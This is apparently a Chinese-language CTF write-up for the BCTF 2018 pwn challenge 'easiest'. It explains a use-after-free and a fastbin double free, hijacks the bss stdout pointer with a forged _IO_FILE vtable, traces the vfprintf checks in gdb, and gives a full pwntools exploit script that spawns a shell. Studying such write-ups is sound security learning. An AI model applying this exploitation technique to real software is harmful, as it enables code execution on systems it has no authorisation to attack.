---
title: 'IO_FILE:pwn_Stdout'
date: 2018-12-02 21:26:07
tags: pwn IO_file
---
TCL TCL
<!--more-->
# 前记
BCTF的easiest...感觉自己对IO_FILE的理解还是太浅了..
看了一遍vfprintf的源码感觉对整个函数的了解加深了不少..
关于bss上的stdoutstdin的作用还是不太清楚
[附件][2]
# Analysis

checksec
```
➜  easyest checksec easiest
[*] '/home/n132/Desktop/easyest/easiest'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
```
程序比较简单只有add和del两种功能
漏洞也比较明显
```arm
  free(array[v1]);
  return puts("delete success !");
```
uaf 
主要考察的是利用...
因为没有输出要么partial write要么用仅知的bss的地址
一开始路走错了以为没有got可以hijacking....
还以为是partial write改写 stdout的_flags
因为输入的时候输入函数的限制:要么被/x00截断要么只写一个0x0a在这想办法绕过这个上面花了太多时间...

```arm
idx = 0;
  while ( 1 )
  {
    ptr = &s[idx];
    res = fread(ptr, 1uLL, 1uLL, stdin);
    if ( (signed int)res <= 0 )
      break;
    if ( *ptr == 10 && v4 )
    {
      if ( idx )
      {
        *ptr = 0;
        return (size_t)&s[idx];
      }
    }
    else if ( (signed int)++idx >= size )
    {
      return idx;
    }
  }
```

最后因为其他一些事没时间打BCTF...还是TCL后来看了wp....
进而学习了一波stdout


这题主要是控制bss上的stdout看了源码之后我感觉很神奇...为啥puts用的是_IO_stdout
也就是真的stdout..
```arm
_IO_puts (const char *str)
{
  int result = EOF;
  size_t len = strlen (str);
  _IO_acquire_lock (_IO_stdout);
  if ((_IO_vtable_offset (_IO_stdout) != 0
       || _IO_fwide (_IO_stdout, -1) == -1)
      && _IO_sputn (_IO_stdout, str, len) == len
      && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)
    result = MIN (INT_MAX, len + 1);
  _IO_release_lock (_IO_stdout);
  return result;
}
```
而printf用的是stdout也就是bss上的那货...让我们有可乘之机..
```arm
int
__printf (const char *format, ...)
{
  va_list arg;
  int done;
  va_start (arg, format);
  done = vfprintf (stdout, format, arg);
  va_end (arg);
  return done;
}
```

* 控制bss上的stdout
* 伪造jumptable
* 利用输出call jumptable 的 _IO_sputn getshell


# printf
主要功能实现在vfprintf
很厉害的一个函数...借着做这题的契机就着[mut3p1g的分析][1]大致读了一遍vfprintf的源码

深感自己功力不足对vfprintf了解还不够...现在还无法分析这个函数

这里简要谈几点：
* 函数主要是在处理format串
* 先把第一个% 前的东西输出到一个buffer中
* 解析% 后的东西，主要分为初始化，对输出宽度，精度处理，类型转换处理
* 输出主要是靠buffered_vfprintf

所以此题需要的函数也就是buffered_vfprintf 
```arm
buffered_vfprintf (FILE *s, const CHAR_T *format, va_list args)
```
函数开始定义了一些类型与变量
并设置一些输出相关值
主要的输出部分在这里
```c
  /* Now flush anything from the helper to the S. */
#ifdef COMPILE_WPRINTF
  if ((to_flush = (hp->_wide_data->_IO_write_ptr
                   - hp->_wide_data->_IO_write_base)) > 0)
    {
      if ((int) _IO_sputn (s, hp->_wide_data->_IO_write_base, to_flush)
          != to_flush)
        result = -1;
    }
#else
  if ((to_flush = hp->_IO_write_ptr - hp->_IO_write_base) > 0)
    {
      if ((int) _IO_sputn (s, hp->_IO_write_base, to_flush) != to_flush)
        result = -1;
    }
#endif
```
通过_IO_sputn输出
```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
```
调用的是jump table 的_IO_XSPUTN
也就是_IO_jump_t的第8个域
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    ...
```
# 思路
这里我们先算出几个重要的偏移(做多了一般就会记住了)
```python
off1=0xd8#vtable‘s off 也就是n132>>> p sizeof(_IO_FILE)
off2=8*8#_IO_xsputn_t
```

然后整理一下思路
* 我们可以通过double free做fastbin atk控制bss
* 控制的地址比较高做不了hijacking但是可以控制bss上的stdout恰好有个printf在输入cmd的时候
* stdout改到bss上
* vtavle可以用我们malloc的chunk来伪造 
* 中间还需要做一些事情让我们顺利执行buffered_vfprintf的输出部分

address of fake_stdout: &ponit_of_chunk_vtable-0xd8
chunk_vtable: '\x00'*56+p64(sh)

这里记录几个容易有问题的地方:
I.
```arm
   0x7ffff7a7f8db <vfprintf+27>    mov    eax, dword ptr fs:[rax]
   0x7ffff7a7f8de <vfprintf+30>    mov    dword ptr [rbp - 0x4a4], eax
   0x7ffff7a7f8e4 <vfprintf+36>    mov    eax, dword ptr [rdi + 0xc0]
 ► 0x7ffff7a7f8ea <vfprintf+42>    test   eax, eax
   0x7ffff7a7f8ec <vfprintf+44>    jne    vfprintf+288 <0x7ffff7a7f9e0>
```
vfprintf的第一个check...这个要是过不了直接没啥好玩的了..注意置0就可以了

II.
```arm
0x7ffff7a7f8fc <vfprintf+60>     mov    ecx, dword ptr [rdi]
   0x7ffff7a7f8fe <vfprintf+62>     test   cl, 8
   0x7ffff7a7f901 <vfprintf+65>     jne    vfprintf+840 <0x7ffff7a7fc08>
 
   0x7ffff7a7f907 <vfprintf+71>     test   rsi, rsi
   0x7ffff7a7f90a <vfprintf+74>     je     vfprintf+869 <0x7ffff7a7fc25>
 
 ► 0x7ffff7a7f910 <vfprintf+80>     test   cl, 2
   0x7ffff7a7f913 <vfprintf+83>     mov    r13, rdx
   0x7ffff7a7f916 <vfprintf+86>     mov    r12, rsi
   0x7ffff7a7f919 <vfprintf+89>     mov    rbx, rdi
```
发现运气超好..后门的地址恰好可以过如果不过了的话还要自己想办法过掉call b ffered_vfprintf

III.
在这里卡了半天...因为我在一般的chunk里面乱写东西...最好置0
```arm
  0x7ffff7a82682 <buffered_vfprintf+210>    mov    esi, 1
   0x7ffff7a82687 <buffered_vfprintf+215>    cmp    dword ptr [rip + 0x3570f2], 0 <0x7ffff7dd9780>
   0x7ffff7a8268e <buffered_vfprintf+222>    je     buffered_vfprintf+232 <0x7ffff7a82698>
    ↓
 ► 0x7ffff7a82698 <buffered_vfprintf+232>    cmpxchg dword ptr [rdx], esi
   0x7ffff7a8269b <buffered_vfprintf+235>    je     buffered_vfprintf+259 <0x7ffff7a826b3>
    ↓
   0x7ffff7a826b3 <buffered_vfprintf+259>    mov    rdx, qword ptr [rbx + 0x88]
   0x7ffff7a826ba <buffered_vfprintf+266>    mov    qword ptr [rdx + 8], r8
```
rdx一般是你的某个chunk...所以不要乱填东西
```python
cmpxchg是汇编指令
作用：比较并交换操作数.
如：CMPXCHG r/m,r 将累加器AL/AX/EAX/RAX中的值与首操作数（目的操作数）比较，如果相等，第2操作数（源操作数）的值装载到首操作数，zf置1。如果不等， 首操作数的值装载到AL/AX/EAX/RAX并将zf清0
```

过了之后就会调后门

# exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("te \n",str(c))
def add(idx,size,c="\x00\x00\x00\x00\x00\x00\x00\x00\n"):
	cmd(1)
	p.sendlineafter("11):",str(idx))
	p.sendlineafter("th:",str(size))
	p.sendafter("C:",c)
def free(idx):
	cmd(2)
	p.sendlineafter("11):",str(idx))
sh=0x000000000400946
p=process("./easiest")
#p=remote('127.0.0.1',4000)
binary=ELF("./easiest")
context.log_level='debug'
add(0,0x38)
add(1,0x38)
add(2,0x38)
add(3,0x38)
add(4,0x88)
add(11,0x8*12,'\x00'*56+p64(sh)+'\n')
free(1)
free(2)
free(1)
add(0,0x38,'\x7a\x20\x60\n')
add(0,0x38)
add(0,0x38)
aim=0x6020c0-0xd8+88
add(0,0x38,p64(0).ljust(22,'\x00')+p64(aim)+'\n')
gdb.attach(p,'b *0x7ffff7a8269b')
cmd("nier")
p.interactive()
```


# end
## I
main.c
```c
#include<stdio.h>
int main()
{
printf("nier");
}
```
```arm
   0x7ffff7a62885 <printf+133>    mov    qword ptr [rsp + 0x18], rax
   0x7ffff7a6288a <printf+138>    mov    rax, qword ptr [rip + 0x36e6bf]
   0x7ffff7a62891 <printf+145>    mov    rdi, qword ptr [rax]
 ► 0x7ffff7a62894 <printf+148>    call   vfprintf <0x7ffff7a5a170>
        s: 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2084
        format: 0x4005c4 ◂— 0x7265696e /* 'nier' */
        arg: 0x7fffffffdd38 ◂— 0x3000000008
 
   0x7ffff7a62899 <printf+153>    add    rsp, 0xd8
   0x7ffff7a628a0 <printf+160>    ret    

```
此时rax是指向libc的某处 用的是libc上的..并且bss上没有stdout@libc
## II
将源码改成
```c
#include<stdio.h>
int main()
{
int i=stdout;
printf("nier");
}
```
同样执行到
```arm
   0x7ffff7a62885 <printf+133>    mov    qword ptr [rsp + 0x18], rax
   0x7ffff7a6288a <printf+138>    mov    rax, qword ptr [rip + 0x36e6bf]
   0x7ffff7a62891 <printf+145>    mov    rdi, qword ptr [rax]
 ► 0x7ffff7a62894 <printf+148>    call   vfprintf <0x7ffff7a5a170>
        s: 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2084
        format: 0x400614 ◂— 0x7265696e /* 'nier' */
        arg: 0x7fffffffdd38 ◂— 0x3000000008
 
   0x7ffff7a62899 <printf+153>    add    rsp, 0xd8
   0x7ffff7a628a0 <printf+160>    ret    
```
可是此时的rax
```arm
 RAX  0x601038 (stdout@@GLIBC_2.2.5) —▸ 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2084
```
指向了bss上stdout...

## III & IV
为了验证puts我也做了puts的实验发现确实源码不会说谎puts一直用的是libc上的stdout

不知是用bss上stdout的备份有特殊用途还是glibc编写时的一个漏洞.




[1]:http://blog.leanote.com/post/mut3p1g/vfprint%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90
[2]:https://github.com/n132/Watermalon/tree/master/Bctf_2018/easiest